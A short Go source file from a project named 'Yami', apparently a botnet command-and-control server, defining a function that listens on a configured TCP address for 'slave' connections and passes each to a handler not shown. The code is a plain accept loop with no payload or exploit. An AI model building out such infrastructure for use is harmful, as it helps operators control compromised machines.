package slaves

import (
	"Yami/core/models/Json"
	"log"
	"net"
)

//Serve starts the slave server
func Serve() {
	if JsonParse.ConfigSyncs.Slaves.Status {
		l, err := net.Listen("tcp", JsonParse.ConfigSyncs.Slaves.Slaves)
		if err != nil {
			log.Fatal(err)
		}
	
		log.Printf(" [Slaves Connection Watcher] [%s]\n", JsonParse.ConfigSyncs.Slaves.Slaves)
		for {
			conn, err := l.Accept()
			if err != nil {
				log.Println(" [SLAVES] ["+err.Error()+"]")
				continue
			}
	
			go handle(conn)
		}
	}
}
